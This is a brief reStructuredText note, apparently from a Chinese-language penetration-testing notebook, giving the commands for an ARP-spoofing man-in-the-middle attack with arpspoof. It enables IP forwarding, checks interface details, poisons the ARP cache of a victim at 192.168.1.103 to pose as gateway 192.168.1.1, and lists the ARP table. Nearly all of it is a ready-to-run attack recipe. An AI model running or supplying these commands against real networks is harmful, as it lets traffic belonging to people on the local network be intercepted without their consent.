.. _arpspoof:

==========
Arpspoof
==========

开启IP转发
::

echo 1 >> /proc/sys/net/ipv4/ip_forward

查看网段信息
::

ip a

对被攻击者进行 ARP 欺骗
::

arpspoof -i eth0 -t 192.168.1.103 192.168.1.1


查看 ARP 映射表
::

arp -a

